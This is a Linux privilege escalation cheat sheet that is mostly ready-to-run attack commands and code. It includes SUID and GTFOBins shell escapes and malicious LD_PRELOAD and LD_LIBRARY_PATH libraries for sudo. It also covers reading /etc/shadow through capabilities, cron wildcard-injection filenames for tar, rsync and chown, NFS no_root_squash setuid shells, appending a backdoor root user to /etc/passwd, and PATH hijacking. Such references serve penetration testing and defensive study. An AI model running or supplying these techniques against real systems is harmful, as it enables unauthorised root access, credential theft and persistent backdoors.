# Linux Privilege Escalation — Deep Reference

## Initial Enumeration Checklist
```bash
# Identity and context
id; whoami; hostname; uname -a
cat /etc/os-release; cat /proc/version
env; echo $PATH

# Users and groups
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/group
last -a; w; who

# Network
ip a; ip route; ss -tlnp; netstat -tlnp
cat /etc/hosts; cat /etc/resolv.conf
iptables -L -n 2>/dev/null

# Running processes
ps auxf
ps -eo user,pid,ppid,%cpu,%mem,args --sort=-%cpu

# Installed packages (may reveal outdated vulnerable software)
dpkg -l 2>/dev/null || rpm -qa 2>/dev/null
```

---

## SUID/SGID Exploitation (T1548.001)

### Discovery
```bash
# All SUID
find / -perm -4000 -type f 2>/dev/null

# All SGID
find / -perm -2000 -type f 2>/dev/null

# SUID owned by root (highest value)
find / -perm -4000 -uid 0 -type f 2>/dev/null

# Custom or unusual SUID (filter out standard)
find / -perm -4000 -type f 2>/dev/null | grep -vE "(ping|su$|sudo|mount|umount|passwd|chsh|chfn|newgrp|gpasswd|pkexec)"
```

### GTFOBins Quick Reference (SUID)
```bash
# bash/sh
/usr/bin/bash -p

# find
find . -exec /bin/sh -p \; -quit

# vim / vi
vim -c ':!/bin/sh'
# or
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")'

# python / python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl
perl -e 'exec "/bin/sh";'

# less / more
less /etc/passwd       # then !/bin/sh
more /etc/passwd       # then !/bin/sh

# nmap (old versions with interactive)
nmap --interactive     # then !sh

# cp — overwrite /etc/passwd
HASH=$(openssl passwd -1 -salt xyz password123)
echo "root2:$HASH:0:0:root:/root:/bin/bash" > /tmp/newline
# use SUID cp to append to /etc/passwd

# env
env /bin/sh -p

# awk
awk 'BEGIN {system("/bin/sh -p")}'

# strace (if SUID)
strace -o /dev/null /bin/sh -p

# taskset
taskset 1 /bin/sh -p

# time
time /bin/sh -p
```

### Custom SUID Binary Analysis
```bash
# Check what libraries/files it accesses
ltrace ./custom_suid 2>&1
strace ./custom_suid 2>&1

# Check for relative path calls (PATH hijack)
strings ./custom_suid | grep -vE "^[/.]"

# Check shared library dependencies
ldd ./custom_suid
```

---

## Sudo Exploitation (T1548.003)

### Discovery & Analysis
```bash
# Current user's sudo rights
sudo -l

# Sudo version (CVE-2021-3156 if < 1.9.5p2)
sudo --version

# Check if sudo caches credentials (timestamp)
sudo -n true 2>/dev/null && echo "CACHED" || echo "no cache"
```

### LD_PRELOAD Exploitation
```bash
# Requires: env_keep += LD_PRELOAD in sudoers
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so <any_allowed_command>
```

### LD_LIBRARY_PATH Exploitation
```bash
# Requires: env_keep += LD_LIBRARY_PATH
# Find shared libraries used by allowed sudo binary
ldd /usr/bin/allowed_binary

# Create malicious library with same name
cat > /tmp/libfake.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() { unsetenv("LD_LIBRARY_PATH"); setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/libcustom.so.1 /tmp/libfake.c
sudo LD_LIBRARY_PATH=/tmp /usr/bin/allowed_binary
```

---

## Capabilities Exploitation (T1548.001)

### Discovery
```bash
getcap -r / 2>/dev/null
```

### Exploitation by Capability
```bash
# cap_setuid+ep — any binary
# python3: os.setuid(0); os.system("/bin/bash")
# perl: POSIX::setuid(0); exec("/bin/bash")
# ruby: Process::Sys.setuid(0); exec("/bin/bash")
# php: posix_setuid(0); system("/bin/bash");

# cap_dac_read_search+ep — read any file
# tar: tar cf - /etc/shadow | tar xf -
# base64: base64 /etc/shadow | base64 -d

# cap_sys_admin — mount host filesystem (containers)
mount /dev/sda1 /mnt

# cap_sys_ptrace — inject into running processes
# Use python ptrace injection or gdb attach
```

---

## Cron & Timer Exploitation (T1053.003)

### Discovery
```bash
# System cron
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# User crons
for user in $(cut -d: -f1 /etc/passwd); do crontab -l -u $user 2>/dev/null; done

# Systemd timers
systemctl list-timers --all

# Live monitoring (most reliable)
./pspy64 -pf -i 1000
```

### Exploitation Patterns
```bash
# 1. Writable cron script
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/writable_script.sh
# Wait for cron execution, then:
/tmp/rootbash -p

# 2. PATH exploitation (cron uses relative binary name)
# If crontab has: * * * * * root backup.sh
# And PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
# Create: /usr/local/bin/backup.sh (if writable) or any earlier PATH dir

# 3. Wildcard injection (tar)
# If cron runs: cd /opt/data && tar czf /tmp/backup.tar.gz *
cd /opt/data
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> shell.sh

# 4. Wildcard injection (rsync)
# If cron runs: rsync -a * /backup/
echo "" > "-e sh shell.sh"

# 5. Wildcard injection (chown)
# If cron runs: chown user:group *
echo "" > "--reference=/path/to/root-owned-file"
```

---

## NFS and Filesystem Attacks

### Discovery
```bash
# From target
cat /etc/exports
mount | grep nfs

# From attacker
showmount -e <target_ip>
```

### no_root_squash Exploitation
```bash
# On attacker (as root):
mkdir /tmp/nfs
mount -t nfs <target>:<share> /tmp/nfs

# Method 1: SUID shell
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash
# On target:
/share/rootbash -p

# Method 2: SUID C wrapper
cat > /tmp/nfs/suid.c << 'EOF'
int main() { setuid(0); setgid(0); system("/bin/bash -p"); return 0; }
EOF
gcc /tmp/nfs/suid.c -o /tmp/nfs/suid
chmod +s /tmp/nfs/suid
# On target: /share/suid
```

### Writable /etc/passwd
```bash
# Generate password hash
openssl passwd -1 -salt salt password123
# Output: $1$salt$...

# Append new root user
echo 'hacker:$1$salt$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker  # password: password123

# Or replace root's password field (x → hash)
```

---

## PATH Hijacking

### Discovery
```bash
# Writable PATH directories
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done

# Find scripts/binaries using relative paths
grep -rn '[^/]exec\|[^/]system\|[^/]popen' /usr/local/bin/ /opt/ 2>/dev/null
# Or just use strings on suspicious SUID binaries
strings /usr/local/bin/custom_app | grep -v "^/"
```

### Exploitation
```bash
# Identify the relative command (e.g., "service" called without /usr/sbin/service)
echo '#!/bin/bash' > /tmp/service
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
# Run the vulnerable binary
/usr/local/bin/custom_app
/tmp/rootbash -p
```
